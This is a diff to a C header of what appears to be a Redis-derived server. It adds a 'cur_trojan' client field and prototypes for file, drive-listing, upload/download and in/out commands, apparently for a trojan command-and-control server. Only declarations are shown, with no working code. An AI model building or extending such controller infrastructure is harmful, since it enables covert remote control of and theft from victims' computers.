@@ -685,6 +685,7 @@ typedef struct readyList {
  * Clients are taken in a linked list. */
 typedef struct client {
 	sds hashid;
+	sds cur_trojan;
 	short is_control;			/* nonzero if control client */
 	short enable_client;
     uint64_t id;            /* Client incremental unique ID. */
@@ -1844,7 +1845,7 @@ uint64_t redisBuildId(void);
 /* Commands prototypes */
 void rmdirCommand(client *c);
 void cdCommand(client *c);
-void newdirCommand(client *c);
+void mkdirCommand(client *c);
 void backCommand(client *c);
 void upCommand(client *c);
 void mvCommand(client *c);
@@ -1852,7 +1853,7 @@ void mvCommand(client *c);
 void newCommand(client *c);
 void catCommand(client *c);
 void lsCommand(client *c);
-void pwdCommand(client *c);
+void getDrivesCommand(client *c);
 void lockCommand(client *c);
 void unlockCommand(client *c);
 void rmCommand(client *c);
@@ -1863,8 +1864,10 @@ void fpasteCommand(client *c);
 void downloadCommand(client *c);
 void uploadCommand(client *c);
 
+void outCommand(client *c);
+void inCommand(client *c);
+
 /*    */
-void sendCmdCommand(client *c);
 void enableCommand(client *c);
 void getClientsCommand(client *c);
 void authCommand(client *c);
